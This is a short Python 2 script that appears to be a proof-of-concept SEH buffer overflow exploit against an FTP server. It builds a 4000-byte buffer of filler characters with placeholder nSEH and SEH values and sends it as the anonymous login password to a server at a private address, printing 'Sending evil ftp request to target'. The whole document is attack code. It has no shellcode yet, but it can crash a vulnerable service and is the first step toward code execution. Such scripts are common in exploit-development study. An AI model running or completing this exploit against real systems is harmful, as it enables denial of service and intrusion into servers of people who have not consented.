import socket
import os
import sys
from ftplib import FTP


nSEH = "B" * 4
SEH = "C" * 4

buffer  = "\x2c"
buffer += "A" * 2559
buffer += nSEH
buffer += SEH
buffer += "D" * (4000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.118', 21)
ftp.login('anonymous', buffer)

